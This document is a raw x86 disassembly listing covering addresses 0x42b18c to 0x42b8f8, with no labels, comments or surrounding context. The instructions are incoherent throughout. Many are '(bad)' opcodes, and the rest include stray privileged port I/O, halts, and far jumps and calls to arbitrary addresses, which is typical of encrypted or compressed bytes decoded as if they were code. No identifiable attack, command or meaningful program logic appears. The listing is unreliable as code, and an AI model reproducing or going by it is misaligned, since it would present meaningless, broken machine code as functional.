  42b18c:	adc    BYTE PTR [edx],al
  42b18e:	mov    bh,BYTE PTR [eax+esi*4]
  42b191:	add    al,0x2a
  42b193:	adc    eax,0xdb60bc1b
  42b198:	shr    ch,0x10
  42b19b:	xchg   esi,eax
  42b19c:	mov    fs,WORD PTR [ecx-0xa]
  42b19f:	stos   DWORD PTR es:[edi],eax
  42b1a0:	xchg   ecx,eax
  42b1a1:	jbe    0x42b204
  42b1a3:	sbb    al,0x91
  42b1a5:	test   DWORD PTR [edi+0x1fa362a2],esp
  42b1ab:	pop    ebp
  42b1ac:	in     al,dx
  42b1ad:	(bad)  
  42b1ae:	and    eax,0x92c612c8
  42b1b3:	aad    0x15
  42b1b5:	sub    ch,BYTE PTR [ecx+0x7b]
  42b1b8:	pop    edi
  42b1b9:	pop    ss
  42b1ba:	add    eax,0xcc5189c6
  42b1bf:	add    esp,DWORD PTR [esi]
  42b1c1:	inc    ecx
  42b1c2:	push   es
  42b1c3:	add    ebx,ebx
  42b1c5:	add    cl,BYTE PTR [esi+esi*4+0x12010b9e]
  42b1cc:	xor    BYTE PTR [eax+0x1f],ah
  42b1cf:	inc    ecx
  42b1d0:	cmp    eax,0xbed48644
  42b1d5:	aam    0x90
  42b1d7:	test   bh,dh
  42b1d9:	ins    DWORD PTR es:[edi],dx
  42b1da:	push   ecx
  42b1db:	or     DWORD PTR [eax+0x7e5f1f03],ebx
  42b1e1:	sahf   
  42b1e2:	sbb    BYTE PTR [esi-0x2ba490e0],0x70
  42b1e9:	add    ecx,DWORD PTR [ecx]
  42b1eb:	xchg   esi,eax
  42b1ec:	xchg   ebx,eax
  42b1ed:	mov    di,0x5807
  42b1f1:	and    ebx,DWORD PTR [esi]
  42b1f3:	stos   DWORD PTR es:[edi],eax
  42b1f4:	fstp   DWORD PTR [edx]
  42b1f6:	adc    al,0x64
  42b1f8:	in     al,0x3e
  42b1fa:	fst    st(4)
  42b1fc:	inc    ebx
  42b1fd:	xchg   DWORD PTR [esi+0xb],esi
  42b200:	fmulp  st(6),st
  42b202:	fsub   DWORD PTR [esi-0x75]
  42b205:	pop    ds
  42b206:	pop    edi
  42b207:	sbb    eax,0xa50da8fc
  42b20c:	pop    eax
  42b20d:	in     eax,dx
  42b20e:	icebp  
  42b20f:	test   al,0xd9
  42b211:	aad    0x5d
  42b213:	jmp    0x7d88:0x4e17c375
  42b21a:	mov    esi,0x9af957d6
  42b21f:	test   DWORD PTR [eax],ecx
  42b221:	loope  0x42b228
  42b223:	shl    BYTE PTR [edx],cl
  42b225:	or     DWORD PTR [edi],esp
  42b227:	fiadd  WORD PTR [edx]
  42b229:	jb     0x42b26a
  42b22b:	pop    es
  42b22c:	hlt    
  42b22d:	fisub  WORD PTR [eax-0x33]
  42b230:	adc    BYTE PTR [ebp+0xf0e5d0e],ah
  42b236:	call   esp
  42b238:	jg     0x42b298
  42b23a:	xchg   esi,eax
  42b23b:	fstp   TBYTE PTR [ebp+edi*2+0x62]
  42b23f:	xchg   ebx,eax
  42b240:	push   esp
  42b241:	imul   ebx,DWORD PTR [esi],0x46ca840f
  42b247:	dec    edi
  42b248:	push   es
  42b249:	xor    eax,0x9dbd4c5
  42b24e:	xchg   edi,eax
  42b24f:	daa    
  42b250:	data16 sar BYTE PTR [ebp+0x71],0xb8
  42b255:	pop    ebp
  42b256:	add    esp,0xb3117a04
  42b25c:	outs   dx,BYTE PTR ds:[esi]
  42b25d:	mov    ecx,ebp
  42b25f:	aam    0x86
  42b261:	mov    dl,0x63
  42b263:	mov    ebp,0x451f795a
  42b268:	mov    eax,0x71ba9f06
  42b26d:	and    esi,DWORD PTR [edx+0x6d]
  42b270:	js     0x42b200
  42b272:	rcr    WORD PTR [edx+ebx*8+0x3f491b99],1
  42b27a:	or     DWORD PTR [edi+0x2c9ab89],0x8a3b0a8c
  42b284:	push   ds
  42b285:	repz (bad) 
  42b287:	aam    0x7c
  42b289:	into   
  42b28a:	sbb    DWORD PTR [eax+ebp*4+0x6f],0x5b
  42b28f:	cmp    BYTE PTR [eax-0x5abfb601],cl
  42b295:	push   esi
  42b296:	mov    ebp,0x901a96c9
  42b29b:	xor    eax,0x560a8f9c
  42b2a0:	and    al,BYTE PTR [ebx+0x10]
  42b2a3:	hlt    
  42b2a4:	lods   eax,DWORD PTR ds:[esi]
  42b2a5:	sahf   
  42b2a6:	cdq    
  42b2a7:	pop    edi
  42b2a8:	es daa 
  42b2aa:	imul   esi
  42b2ac:	sub    eax,0x3aaea842
  42b2b1:	mov    ch,0x33
  42b2b3:	xlat   BYTE PTR ds:[ebx]
  42b2b4:	mov    esp,?
  42b2b6:	jp     0x42b289
  42b2b8:	mov    ch,0xf1
  42b2ba:	or     al,0xf
  42b2bc:	mov    fs,WORD PTR [ebp+0x2acce250]
  42b2c2:	add    esi,DWORD PTR [edi]
  42b2c4:	ret    
  42b2c5:	xchg   ebx,eax
  42b2c6:	std    
  42b2c7:	inc    ebp
  42b2c8:	adc    BYTE PTR [esp+ebp*2],0x70
  42b2cc:	pop    esp
  42b2cd:	sbb    al,0x75
  42b2cf:	aad    0x90
  42b2d1:	sbb    DWORD PTR [ebx+0x4f],edx
  42b2d4:	mov    BYTE PTR [edi-0x58],dh
  42b2d7:	fs push cs
  42b2d9:	pusha  
  42b2da:	mov    BYTE PTR [ebp+0x25de020d],al
  42b2e0:	shl    DWORD PTR [ebx],1
  42b2e2:	and    DWORD PTR [eax],edi
  42b2e4:	pop    es
  42b2e5:	dec    ecx
  42b2e6:	pusha  
  42b2e7:	xchg   edi,eax
  42b2e8:	int3   
  42b2e9:	jmp    0x42b299
  42b2eb:	xchg   ebx,eax
  42b2ed:	pop    ds
  42b2ee:	adc    edx,DWORD PTR [edi+0x62]
  42b2f1:	and    esi,DWORD PTR [eax]
  42b2f3:	xlat   BYTE PTR ds:[ebx]
  42b2f4:	push   ss
  42b2f5:	rcr    DWORD PTR ds:0x76b671a1,cl
  42b2fb:	js     0xb67e0d2
  42b301:	xchg   edx,eax
  42b302:	loop   0x42b2b0
  42b304:	daa    
  42b305:	add    ecx,esp
  42b307:	or     ecx,esi
  42b309:	mov    al,ds:0x2821e7dc
  42b30e:	pusha  
  42b30f:	pop    es
  42b310:	inc    edi
  42b311:	sub    edx,eax
  42b313:	mov    BYTE PTR [edi+0x3c],0xde
  42b317:	les    esp,FWORD PTR [esi-0x4af463fe]
  42b31d:	arpl   WORD PTR [eax+0x60a2d137],sp
  42b323:	xchg   ebx,eax
  42b324:	in     al,dx
  42b325:	push   ss
  42b326:	mov    ecx,0x58bc981
  42b32b:	adc    al,0xeb
  42b32d:	repnz lea eax,[ebx-0x1a48ea7d]
  42b334:	push   ecx
  42b335:	ret    0xc51f
  42b338:	or     ebp,DWORD PTR [edx+edi*4-0x3e]
  42b33c:	sub    al,0x3
  42b33e:	add    dl,BYTE PTR [ebp-0x35b676bd]
  42b344:	dec    ecx
  42b345:	repz cmp al,0xd
  42b348:	mov    ch,ch
  42b34a:	outs   dx,BYTE PTR ds:[esi]
  42b34b:	push   eax
  42b34c:	jbe    0x42b356
  42b34e:	loop   0x42b330
  42b350:	es stc 
  42b352:	leave  
  42b353:	aam    0x6e
  42b355:	lods   al,BYTE PTR ds:[esi]
  42b356:	and    esp,DWORD PTR [esp+esi*1+0xb]
  42b35a:	xor    dh,BYTE PTR [edx+0x1d054b89]
  42b360:	in     al,dx
  42b361:	in     al,dx
  42b362:	jle    0x42b2e4
  42b364:	sub    al,0xf2
  42b366:	jg     0x42b33c
  42b368:	lods   eax,DWORD PTR ds:[esi]
  42b369:	add    DWORD PTR [ebx-0x49642629],ebx
  42b36f:	mov    ebp,0x94511388
  42b374:	fcmovnbe st,st(2)
  42b376:	dec    ebp
  42b377:	out    dx,eax
  42b378:	and    bh,bh
  42b37a:	(bad)  
  42b37b:	aam    0xb4
  42b37d:	test   BYTE PTR [ebp+0x70],ah
  42b380:	push   ebp
  42b381:	outs   dx,DWORD PTR ds:[esi]
  42b382:	mov    esi,0x56a387d4
  42b387:	jns    0x42b3e3
  42b389:	hlt    
  42b38a:	and    BYTE PTR [edx-0x2f820b98],bh
  42b390:	fiadd  WORD PTR [edx-0x600bfd86]
  42b396:	lahf   
  42b397:	bound  ebp,QWORD PTR [edx]
  42b399:	pusha  
  42b39a:	push   ds
  42b39b:	inc    ebx
  42b39c:	lods   eax,DWORD PTR ds:[esi]
  42b39d:	jo     0x42b411
  42b39f:	pusha  
  42b3a0:	(bad)  [ecx-0x41]
  42b3a3:	ret    
  42b3a4:	pop    ebx
  42b3a5:	add    DWORD PTR [esi+0x5d],esp
  42b3a8:	mov    bh,0xd5
  42b3aa:	ret    
  42b3ab:	std    
  42b3ac:	cmp    ch,BYTE PTR [ebx-0x7c68fc28]
  42b3b2:	pavgw  mm1,mm1
  42b3b5:	test   DWORD PTR [ecx],ecx
  42b3b7:	ins    BYTE PTR es:[edi],dx
  42b3b8:	push   esi
  42b3b9:	mov    dh,0x72
  42b3bb:	aam    0x9
  42b3bd:	jbe    0x42b3a3
  42b3bf:	popf   
  42b3c0:	mov    ch,0xff
  42b3c2:	xor    DWORD PTR [ebp+0x39c665c0],esi
  42b3c8:	xchg   esi,esi
  42b3ca:	or     BYTE PTR [ebx+0x8],0xe8
  42b3ce:	dec    ecx
  42b3cf:	dec    esp
  42b3d0:	push   eax
  42b3d1:	add    bl,BYTE PTR [edx-0x450e6d3a]
  42b3d7:	es and eax,0x7ae760e2
  42b3dd:	inc    eax
  42b3de:	arpl   ax,sp
  42b3e0:	and    bh,BYTE PTR [edx+0x17]
  42b3e3:	aam    0x31
  42b3e5:	inc    ebx
  42b3e6:	sub    DWORD PTR [ebp+0x3cc64dbd],eax
  42b3ec:	mov    DWORD PTR [ebx-0xea430f9],ebx
  42b3f2:	lds    eax,FWORD PTR [eax-0x30]
  42b3f5:	add    eax,0xc5f25ca2
  42b3fa:	xchg   ebp,eax
  42b3fb:	jb     0x42b43b
  42b3fd:	mov    fs,WORD PTR [edx-0x71]
  42b400:	jmp    0xef99:0x75b4465a
  42b407:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b408:	push   ecx
  42b409:	sbb    ecx,DWORD PTR [edx-0x773081cf]
  42b40f:	push   ebp
  42b410:	out    0x52,eax
  42b412:	aam    0xaa
  42b414:	mov    ecx,ecx
  42b416:	add    DWORD PTR [edi],esp
  42b418:	jmp    0x7005:0xd1210e22
  42b41f:	leave  
  42b420:	mov    esp,0x57524d20
  42b425:	call   0x17df:0x2792197
  42b42c:	mov    WORD PTR [edx+0x3255d1d],?
  42b432:	shl    BYTE PTR [eax-0x5d],0x5c
  42b436:	mov    eax,0x60dc68cf
  42b43b:	and    DWORD PTR [eax-0x486718bd],eax
  42b441:	sub    dh,BYTE PTR [ecx+0x36005ab5]
  42b447:	mov    ah,0x74
  42b449:	(bad)  
  42b44a:	fcom   st(1)
  42b44c:	mov    eax,0x79ae82e5
  42b451:	out    0xb,al
  42b453:	fisttp WORD PTR [ecx-0x60c5a603]
  42b459:	je     0x42b459
  42b45b:	cmp    DWORD PTR [edx+0x43cd2205],ebp
  42b461:	pusha  
  42b462:	ret    0xc9f1
  42b465:	std    
  42b466:	not    DWORD PTR ss:[ebp-0x33]
  42b46a:	ins    DWORD PTR es:[edi],dx
  42b46b:	and    DWORD PTR [edx],eax
  42b46d:	ins    BYTE PTR es:[edi],dx
  42b46e:	inc    esi
  42b46f:	iret   
  42b470:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b471:	test   DWORD PTR [eax+0x1694f6e0],0xf9d6c4d7
  42b47b:	push   ebx
  42b47c:	call   0x89e2c150
  42b481:	fcmovne st,st(2)
  42b483:	(bad)  
  42b484:	fcomp  QWORD PTR [eax+0x2bf065a]
  42b48a:	xchg   edx,eax
  42b48b:	sub    dh,0xa6
  42b48e:	xchg   ebx,eax
  42b48f:	jns    0x42b426
  42b491:	adc    BYTE PTR [edi],bl
  42b493:	std    
  42b494:	arpl   WORD PTR [ecx-0x73],si
  42b497:	xchg   esi,eax
  42b498:	cmp    BYTE PTR [eax+eiz*4],ah
  42b49b:	aad    0x36
  42b49d:	dec    esi
  42b49e:	push   cs
  42b49f:	test   eax,0x1e6b2f1
  42b4a4:	mov    ebp,esp
  42b4a6:	adc    dh,al
  42b4a8:	cmp    edx,DWORD PTR [edx+ecx*2]
  42b4ab:	rcl    ch,cl
  42b4ad:	pop    ss
  42b4ae:	ss dec edx
  42b4b0:	or     edx,edx
  42b4b2:	test   DWORD PTR ds:0x762976a,esi
  42b4b8:	lods   eax,DWORD PTR ds:[esi]
  42b4b9:	loope  0x42b46b
  42b4bb:	pushf  
  42b4bc:	mov    DWORD PTR [ecx+0x6f3eaea3],esi
  42b4c2:	adc    ah,dl
  42b4c4:	mov    edx,0x844dee26
  42b4c9:	or     eax,0xd5b7c997
  42b4ce:	or     BYTE PTR [edx-0x78],cl
  42b4d1:	dec    esp
  42b4d2:	mov    ecx,0x83bca69f
  42b4d7:	(bad)  
  42b4d8:	(bad)  
  42b4d9:	mov    ch,0x2d
  42b4db:	xchg   cl,ch
  42b4dd:	(bad)  
  42b4de:	mov    ch,0xf4
  42b4e0:	dec    esi
  42b4e1:	repz pop ds
  42b4e3:	mov    DWORD PTR ds:0x6bac3725,edi
  42b4e9:	pop    ss
  42b4ea:	icebp  
  42b4eb:	ja     0x42b4ed
  42b4ed:	xor    BYTE PTR [ebx],0xc9
  42b4f0:	and    eax,0xf7586d1
  42b4f5:	mov    edx,0x53d8551f
  42b4fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b4fb:	adc    BYTE PTR [eax],bh
  42b4fd:	adc    DWORD PTR [ebp-0x2b],esp
  42b500:	push   edi
  42b501:	xor    dl,BYTE PTR [ebp+0x5a]
  42b504:	hlt    
  42b505:	fist   DWORD PTR [esi-0x196c70c2]
  42b50b:	mov    BYTE PTR [edx],cl
  42b50d:	inc    esi
  42b50e:	clc    
  42b50f:	inc    ebp
  42b510:	and    ch,BYTE PTR [edx+0xd8cbada]
  42b516:	out    dx,al
  42b517:	jo     0x42b561
  42b519:	push   edi
  42b51a:	dec    eax
  42b51b:	adc    eax,0x51fba28
  42b520:	and    DWORD PTR [edi-0x4979a35c],0x43fdd57f
  42b52a:	push   0xfffffffe
  42b52c:	lock push ss
  42b52e:	test   al,0xa6
  42b530:	mov    WORD PTR [edi+0x2a8e12dc],?
  42b536:	and    dl,BYTE PTR [ecx+eiz*1+0x77]
  42b53a:	pop    ds
  42b53b:	sbb    al,0x6d
  42b53d:	jle    0x42b5ac
  42b53f:	lea    ecx,[ebp-0x6b]
  42b542:	fst    DWORD PTR [ebp+eax*1-0x54]
  42b546:	mov    cl,0x18
  42b548:	(bad)  
  42b549:	and    DWORD PTR gs:[ecx-0x66],0x7
  42b54e:	out    dx,eax
  42b54f:	hlt    
  42b550:	push   esp
  42b551:	adc    edx,DWORD PTR [edi]
  42b553:	aam    0x46
  42b555:	dec    edi
  42b556:	cvttps2pi mm5,QWORD PTR [ebp-0x7741935c]
  42b55d:	xor    DWORD PTR [edx+edi*8],0x1b
  42b561:	int3   
  42b562:	rcr    ebx,cl
  42b564:	jmp    0xf9f1:0x889fdfcd
  42b56b:	xor    BYTE PTR [esi+0x39],bh
  42b56e:	in     al,dx
  42b56f:	into   
  42b570:	mov    DWORD PTR [ebx],ebp
  42b572:	xor    al,0x42
  42b574:	jne    0x42b58d
  42b576:	sbb    DWORD PTR [ecx-0x3a],esi
  42b579:	add    BYTE PTR [esi],dh
  42b57b:	dec    esp
  42b57c:	(bad)  
  42b57d:	mov    ch,0x85
  42b57f:	push   eax
  42b580:	xchg   esi,eax
  42b581:	inc    ebx
  42b582:	rcl    BYTE PTR [ebp+0x66],cl
  42b585:	jno    0x42b5a5
  42b587:	xlat   BYTE PTR ds:[ebx]
  42b588:	dec    ecx
  42b589:	rol    BYTE PTR [esi],1
  42b58b:	adc    al,0xf2
  42b58e:	test   BYTE PTR [ecx-0x3b785ea],ch
  42b594:	pop    es
  42b595:	jle    0x42b5b5
  42b597:	or     eax,0xcebd8bda
  42b59c:	call   0x828b:0x5bd127e0
  42b5a3:	add    DWORD PTR [esi],esi
  42b5a5:	rcl    BYTE PTR [ebp+0x3efa1ece],cl
  42b5ab:	lds    ecx,FWORD PTR [ecx+0x64822985]
  42b5b1:	cmp    BYTE PTR [esi-0x6dfa6374],0xd3
  42b5b8:	and    eax,0xb01e0196
  42b5bd:	sub    bl,BYTE PTR [ebx+0x41]
  42b5c0:	(bad)  [edi-0x61]
  42b5c3:	sbb    BYTE PTR [esi],ch
  42b5c5:	call   edi
  42b5c7:	push   ds
  42b5c8:	data16 add ch,BYTE PTR [eax+0x4d]
  42b5cc:	xor    BYTE PTR [eax+esi*8],ah
  42b5cf:	std    
  42b5d0:	xchg   ebp,eax
  42b5d1:	mov    ds:0xb6a93568,eax
  42b5d6:	(bad)  
  42b5d7:	stc    
  42b5d8:	or     ecx,ecx
  42b5da:	or     al,0x4c
  42b5dc:	push   edx
  42b5dd:	dec    eax
  42b5de:	out    dx,al
  42b5df:	pushf  
  42b5e0:	inc    ecx
  42b5e1:	sbb    BYTE PTR [ecx],0x22
  42b5e4:	cmp    al,0x9b
  42b5e6:	in     eax,0xf9
  42b5e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b5e9:	mov    DWORD PTR [eax+eiz*1-0x69],esp
  42b5ed:	popa   
  42b5ee:	clc    
  42b5ef:	cwde   
  42b5f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b5f1:	inc    eax
  42b5f2:	push   ds
  42b5f3:	or     eax,0x4b08a3e7
  42b5f8:	lock sbb al,0xc4
  42b5fb:	mov    ds:0x77c44649,al
  42b600:	test   DWORD PTR [edx],0xccafe35e
  42b606:	pop    ds
  42b607:	jae    0x42b685
  42b609:	test   eax,0x229d1e16
  42b60e:	call   0xa44845ef
  42b613:	cmp    DWORD PTR [ecx-0x444aa83a],esp
  42b619:	dec    edi
  42b61a:	pop    ds
  42b61b:	jmp    0x42b604
  42b61d:	xchg   dh,cl
  42b61f:	mov    ds:0xd5f3a108,eax
  42b624:	addr16 out dx,eax
  42b626:	add    DWORD PTR [ebx-0x27778c2b],edi
  42b62c:	mov    DWORD PTR [ebx-0x67],ecx
  42b62f:	xor    al,0x25
  42b631:	ins    BYTE PTR es:[edi],dx
  42b632:	(bad)  
  42b633:	push   ss
  42b634:	ins    BYTE PTR es:[edi],dx
  42b635:	and    eax,0x5908d3e4
  42b63a:	sahf   
  42b63b:	jno    0x42b65a
  42b63d:	sbb    BYTE PTR [ebp+ebx*8-0x77],0xf9
  42b642:	adc    dl,bh
  42b644:	push   ebp
  42b645:	fmul   DWORD PTR [edi-0x62]
  42b648:	(bad)  
  42b649:	dec    eax
  42b64a:	ins    BYTE PTR es:[edi],dx
  42b64b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b64c:	aam    0x2
  42b64e:	fs loope 0x42b637
  42b651:	adc    ebp,DWORD PTR [edi-0x2232765e]
  42b657:	jle    0x42b6a4
  42b659:	push   ebx
  42b65a:	inc    esi
  42b65b:	mov    bl,0x22
  42b65d:	add    BYTE PTR [edx+0x27fc3cde],al
  42b663:	shr    ah,0xe5
  42b666:	jo     0x42b634
  42b668:	pop    ebp
  42b669:	shl    DWORD PTR [edx+0x5f],1
  42b66c:	fucomip st,st(4)
  42b66e:	adc    esp,eax
  42b670:	sub    BYTE PTR [ecx],al
  42b672:	push   es
  42b673:	rcl    DWORD PTR [eax],0x2
  42b676:	push   0xffffffba
  42b678:	call   0x719d1e7a
  42b67d:	cmp    al,0x75
  42b67f:	mov    bh,0x24
  42b681:	pop    DWORD PTR [ebx-0x30]
  42b684:	xchg   DWORD PTR cs:[ebp+edx*1-0x2b954fb2],eax
  42b68c:	pop    edx
  42b68d:	ja     0x42b656
  42b68f:	inc    ecx
  42b690:	cdq    
  42b691:	repz pop ss
  42b693:	fsubp  st(1),st
  42b695:	(bad)  
  42b696:	pusha  
  42b697:	ret    
  42b698:	mov    ds:0x886785d7,eax
  42b69d:	es push es
  42b69f:	aam    0x7b
  42b6a1:	xchg   DWORD PTR [eax+0x43],ebp
  42b6a4:	das    
  42b6a5:	shl    DWORD PTR [ecx+ebp*1-0xbf97478],0xa8
  42b6ad:	mov    ds:0x2e114eb,eax
  42b6b2:	adc    al,0x52
  42b6b4:	jl     0x42b6f4
  42b6b6:	fsubr  QWORD PTR [edi-0x60]
  42b6b9:	adc    BYTE PTR [esp+eiz*2],0x89
  42b6bd:	mov    ebx,0xae31e66f
  42b6c2:	dec    edx
  42b6c3:	nop
  42b6c4:	and    ecx,esp
  42b6c6:	mov    ecx,0x60c6625a
  42b6cb:	xor    ebp,DWORD PTR ds:0x4b8648f1
  42b6d1:	mov    dl,0x1f
  42b6d3:	fbstp  TBYTE PTR [edi-0x27f8889f]
  42b6d9:	xchg   edi,eax
  42b6da:	lods   al,BYTE PTR ds:[esi]
  42b6db:	aam    0xea
  42b6dd:	mov    dh,cl
  42b6df:	mov    WORD PTR [edi],es
  42b6e1:	adc    al,0x5
  42b6e3:	mov    DWORD PTR gs:[ebx-0x1183fbd7],ebp
  42b6ea:	(bad)  
  42b6eb:	popa   
  42b6ec:	js     0x42b6b0
  42b6ee:	hlt    
  42b6ef:	mov    ebx,0x59cefa7f
  42b6f4:	xchg   ebp,eax
  42b6f5:	popf   
  42b6f6:	pop    ds
  42b6f7:	adc    ebx,0x10
  42b6fa:	inc    eax
  42b6fb:	jp     0x42b6af
  42b6fd:	ret    0xe325
  42b700:	add    eax,0xe7149e03
  42b705:	in     eax,dx
  42b706:	mov    dl,0xa0
  42b708:	mov    cl,0xaf
  42b70a:	nop
  42b70b:	sub    BYTE PTR [eax-0x4b9457c9],cl
  42b711:	out    dx,eax
  42b712:	out    0xef,al
  42b714:	jle    0x42b734
  42b716:	and    BYTE PTR ds:[ebp-0x6],dl
  42b71a:	ffreep st(6)
  42b71c:	dec    ecx
  42b71d:	mov    ecx,0xd5b6c527
  42b722:	cmp    al,0x43
  42b724:	mov    DWORD PTR [ebp+0xc],ebp
  42b727:	imul   edx,esi,0x2d
  42b72a:	pusha  
  42b72b:	(bad)  
  42b72c:	scas   eax,DWORD PTR es:[edi]
  42b72d:	or     eax,0xc87ceea4
  42b732:	inc    ebx
  42b733:	xchg   ebp,eax
  42b734:	adc    al,0x1e
  42b736:	push   ds
  42b737:	pop    ecx
  42b738:	rcl    ecx,cl
  42b73a:	mov    al,0x54
  42b73c:	jb     0x42b788
  42b73e:	pop    esi
  42b73f:	aad    0x5b
  42b741:	adc    al,0x10
  42b743:	dec    ebp
  42b744:	call   0x998f:0x88692f0a
  42b74b:	sub    bl,dl
  42b74d:	nop
  42b74e:	mov    bh,0xda
  42b750:	jno    0x42b755
  42b752:	or     BYTE PTR [esi-0x1d95f37],al
  42b758:	xchg   ecx,eax
  42b759:	inc    ebx
  42b75a:	hlt    
  42b75b:	inc    edi
  42b75c:	call   0xe01673b9
  42b761:	popa   
  42b762:	add    DWORD PTR ds:0xd31e151c,ebp
  42b768:	mov    edx,0xe08eb05c
  42b76d:	ins    DWORD PTR es:[edi],dx
  42b76e:	or     eax,DWORD PTR [ebp-0x553cbc06]
  42b774:	rcr    BYTE PTR [ecx-0x64],0x75
  42b778:	adc    dh,BYTE PTR ds:0x2b89e545
  42b77e:	jmp    0x42b7a2
  42b780:	popa   
  42b781:	xor    eax,0x5df5338
  42b786:	push   ss
  42b787:	outs   dx,DWORD PTR ds:[esi]
  42b788:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b789:	mov    esi,0xd0a2b72b
  42b78e:	pop    ds
  42b78f:	sub    eax,0x833ba9a
  42b794:	(bad)  
  42b796:	imul   edx,esp,0xcedd47da
  42b79c:	jmp    0x89c8a7d1
  42b7a1:	mov    ebx,0xd9d2bbd
  42b7a6:	inc    edx
  42b7a7:	xchg   edi,eax
  42b7a8:	stos   DWORD PTR es:[edi],eax
  42b7a9:	add    ch,BYTE PTR [edx]
  42b7ab:	fst    DWORD PTR [edx-0x4f]
  42b7ae:	mov    ch,0xf8
  42b7b0:	and    al,0x86
  42b7b2:	sbb    eax,0x6b0389bc
  42b7b7:	xor    ch,BYTE PTR [ebx]
  42b7b9:	int3   
  42b7ba:	jbe    0x42b801
  42b7bc:	inc    edx
  42b7bd:	out    0x8,al
  42b7bf:	ror    dh,cl
  42b7c1:	mov    dl,0x96
  42b7c3:	push   eax
  42b7c4:	adc    esi,DWORD PTR [eax+0x3e]
  42b7c7:	add    DWORD PTR [ecx+eax*2],esp
  42b7ca:	pop    ds
  42b7cb:	mov    bh,0x10
  42b7cd:	and    al,0x99
  42b7cf:	jmp    0x42b7f7
  42b7d1:	mov    edi,DWORD PTR [eax-0x2c]
  42b7d4:	pop    ebp
  42b7d5:	int    0x6a
  42b7d7:	sub    ebp,eax
  42b7d9:	sbb    bh,dl
  42b7db:	xor    eax,0x96a66989
  42b7e0:	mov    al,0xe7
  42b7e2:	(bad)  
  42b7e4:	imul   ebx,DWORD PTR ds:0xf6da6a3a,0x1e
  42b7eb:	out    dx,eax
  42b7ec:	dec    ecx
  42b7ed:	cmp    edx,DWORD PTR [esi-0x34]
  42b7f0:	mov    es,WORD PTR [ecx-0x3d4d696a]
  42b7f6:	repnz fisubr WORD PTR fs:[ebx+ebp*2+0x633c30b8]
  42b7ff:	test   eax,0x13077f8a
  42b804:	ins    DWORD PTR es:[edi],dx
  42b805:	std    
  42b806:	pusha  
  42b807:	pop    ecx
  42b808:	sub    al,0x4d
  42b80a:	xor    ebx,DWORD PTR [edx]
  42b80c:	push   esi
  42b80d:	dec    eax
  42b80e:	xlat   BYTE PTR ds:[ebx]
  42b80f:	mov    DWORD PTR [esi-0x76],eax
  42b812:	jo     0x42b7ad
  42b814:	mov    bh,0x82
  42b816:	cmc    
  42b817:	or     al,0x79
  42b819:	inc    ebp
  42b81a:	outs   dx,DWORD PTR ds:[esi]
  42b81b:	cwde   
  42b81c:	mov    DWORD PTR [ebx+0x1],eax
  42b81f:	ret    0x2968
  42b822:	cmp    BYTE PTR [edx],dl
  42b824:	mov    ebp,0xb5f57e02
  42b829:	mov    ebx,DWORD PTR [edi]
  42b82b:	call   0xd9f6:0x8d60f83e
  42b832:	lock out 0xec,eax
  42b835:	xchg   ebx,eax
  42b836:	test   al,0xd4
  42b838:	fs enter 0xd989,0x8d
  42b83d:	and    al,0xe6
  42b83f:	lods   eax,DWORD PTR ds:[esi]
  42b840:	mov    BYTE PTR [ecx-0x607e1d7f],bh
  42b846:	pop    ss
  42b847:	push   0xbe810df
  42b84c:	fidivr DWORD PTR [ecx]
  42b84e:	ins    DWORD PTR es:[edi],dx
  42b84f:	std    
  42b850:	jecxz  0x42b837
  42b852:	sub    cl,ah
  42b854:	gs aas 
  42b856:	jp     0x42b7ef
  42b858:	add    BYTE PTR [esi],cl
  42b85a:	out    dx,al
  42b85b:	adc    al,0x3f
  42b85d:	fsub   QWORD PTR [ebp+0x46]
  42b860:	in     eax,0x17
  42b862:	loopne 0x42b81e
  42b864:	(bad)  
  42b865:	xchg   BYTE PTR [edx-0x4f4844ee],bl
  42b86b:	sahf   
  42b86c:	int3   
  42b86d:	aam    0x60
  42b86f:	pop    es
  42b870:	popf   
  42b871:	jae    0x42b8a2
  42b873:	jo     0x42b8d2
  42b875:	push   cs
  42b876:	loop   0x42b8e5
  42b878:	sub    ch,BYTE PTR [edx+0x5bb2d4b8]
  42b87e:	std    
  42b87f:	jmp    0x42b878
  42b881:	fdivr  DWORD PTR [esi-0x33]
  42b884:	adc    ebx,esp
  42b886:	mov    ss,WORD PTR [edi+0x4d]
  42b889:	out    dx,al
  42b88a:	cdq    
  42b88b:	fldcw  WORD PTR [eax]
  42b88d:	stos   DWORD PTR es:[edi],eax
  42b88e:	ret    0x17d5
  42b891:	js     0x42b846
  42b893:	cli    
  42b894:	xchg   ebx,eax
  42b895:	(bad)  [edx-0x33]
  42b898:	mov    ebx,edi
  42b89a:	mov    DWORD PTR ds:0x930a74d4,edx
  42b8a0:	bound  eax,QWORD PTR [ebx]
  42b8a2:	mov    edx,0x9b5041b9
  42b8a7:	jb     0x42b8dc
  42b8a9:	lds    esp,FWORD PTR [eax+0x7d]
  42b8ac:	adc    DWORD PTR [esi+0x7c],ecx
  42b8af:	mov    al,ds:0xd483a984
  42b8b4:	stos   BYTE PTR es:[edi],al
  42b8b5:	aaa    
  42b8b6:	and    al,0x27
  42b8b8:	data16 rcl BYTE PTR [edx-0x59447788],0xd
  42b8c0:	adc    bh,ch
  42b8c2:	ins    BYTE PTR es:[edi],dx
  42b8c3:	hlt    
  42b8c4:	cld    
  42b8c5:	mov    dl,cl
  42b8c7:	mov    esi,0xbd5c4c8f
  42b8cc:	inc    edi
  42b8cd:	icebp  
  42b8ce:	out    dx,eax
  42b8cf:	stos   BYTE PTR es:[edi],al
  42b8d0:	and    DWORD PTR [eax],eax
  42b8d2:	pop    ds
  42b8d3:	shl    DWORD PTR [esi],cl
  42b8d5:	data16 je 0x42b942
  42b8d8:	inc    edi
  42b8d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b8da:	add    eax,0x300585c1
  42b8df:	cmp    edi,DWORD PTR [ecx+0x526f8804]
  42b8e5:	or     BYTE PTR [edi],bl
  42b8e7:	inc    edi
  42b8e8:	and    BYTE PTR cs:[eax-0x78],cl
  42b8ec:	ret    0xcdb6
  42b8ef:	aam    0x68
  42b8f1:	xchg   BYTE PTR [edx-0xb7a6a65],dl
  42b8f7:	(bad)  
  42b8f8:	ins    BYTE PTR es:[edi],dx
